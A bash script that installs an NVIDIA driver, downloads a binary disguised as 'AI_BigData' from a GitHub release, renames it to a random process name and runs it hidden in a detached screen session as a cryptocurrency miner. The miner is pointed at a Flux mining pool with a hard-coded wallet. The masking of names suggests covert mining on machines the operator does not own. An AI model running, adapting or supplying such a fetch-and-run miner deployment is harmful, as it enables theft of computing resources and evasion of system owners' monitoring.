#!/bin/bash
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
rm -rf NVIDIA-Linux-x86_64-510.47.03.run
wget https://us.download.nvidia.com/tesla/510.47.03/NVIDIA-Linux-x86_64-510.47.03.run
sudo chmod +x NVIDIA-Linux-x86_64-510.47.03.run
./NVIDIA-Linux-x86_64-510.47.03.run
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
mv AI_BigData $azure -n
cp $azure "$cpuname"
rm -f  AI_BigData
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --user t1SzPN5ZrAccHeSGPcxwzuwL9Qk54GUzEJi.wollfoo --ssl --server eu-flux.fluxpools.net --port 7003 --pass wow --algo 125_4 --pers ZelProof
